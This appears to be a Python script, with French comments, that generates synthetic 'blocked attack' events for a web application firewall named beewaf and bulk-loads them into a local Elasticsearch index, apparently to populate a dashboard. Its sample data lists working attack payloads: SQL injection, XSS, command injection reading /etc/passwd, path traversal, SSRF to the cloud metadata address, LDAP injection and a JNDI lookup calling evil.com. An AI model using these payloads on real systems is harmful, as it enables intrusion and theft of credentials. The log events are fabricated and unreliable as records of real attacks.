import requests
import json
from datetime import datetime

# Attaques en temps réel
attacks = []
now = datetime.now()

attack_data = [
    {"reason": "regex-sqli", "ip": "89.248.171.41", "payload": "1' OR 1=1--", "path": "/login"},
    {"reason": "regex-xss", "ip": "185.220.101.1", "payload": "<script>alert(1)</script>", "path": "/search"},
    {"reason": "regex-cmdi", "ip": "77.247.181.163", "payload": "; cat /etc/passwd", "path": "/upload"},
    {"reason": "regex-path-traversal", "ip": "45.33.32.156", "payload": "../../../etc/passwd", "path": "/file"},
    {"reason": "regex-ssrf", "ip": "94.102.49.190", "payload": "http://169.254.169.254/metadata", "path": "/proxy"},
    {"reason": "regex-ldap", "ip": "151.80.39.44", "payload": "*)(&(password=*)", "path": "/auth"},
    {"reason": "regex-jndi", "ip": "212.227.17.169", "payload": "${jndi:ldap://evil.com}", "path": "/log"},
    {"reason": "rate-limit", "ip": "103.214.160.42", "payload": "flood", "path": "/api"},
]

# Créer 20 attaques récentes (dernières 5 minutes)
for i in range(20):
    attack = attack_data[i % len(attack_data)]
    # Timestamp très récent (dernières 5 minutes)
    timestamp_offset = i * 15  # 15 secondes entre chaque attaque
    timestamp = datetime.now()
    if timestamp_offset > 0:
        from datetime import timedelta
        timestamp = timestamp - timedelta(seconds=timestamp_offset)
    
    event = {
        "@timestamp": timestamp.isoformat() + "Z",
        "service": "beewaf",
        "level": "WARNING", 
        "logger_name": "beewaf",
        "event": "blocked",
        "client_ip": attack["ip"],
        "method": "POST",
        "path": attack["path"],
        "reason": attack["reason"],
        "status_code": 403,
        "body_preview": attack["payload"],
        "attack_type": attack["reason"].replace("regex-", "")
    }
    attacks.append(event)

# Bulk insert
bulk_data = ""
for event in attacks:
    index_line = {"index": {"_index": f"beewaf-logs-{datetime.now().strftime('%Y.%m.%d')}"}}
    bulk_data += json.dumps(index_line) + "\n" 
    bulk_data += json.dumps(event) + "\n"

try:
    response = requests.post("http://localhost:9200/_bulk",
                           data=bulk_data,
                           headers={"Content-Type": "application/x-ndjson"})
    if response.status_code == 200:
        print(f"✅ 20 attaques temps réel ajoutées")
    else:
        print(f"❌ Erreur: {response.status_code}")
except Exception as e:
    print(f"Erreur: {e}")
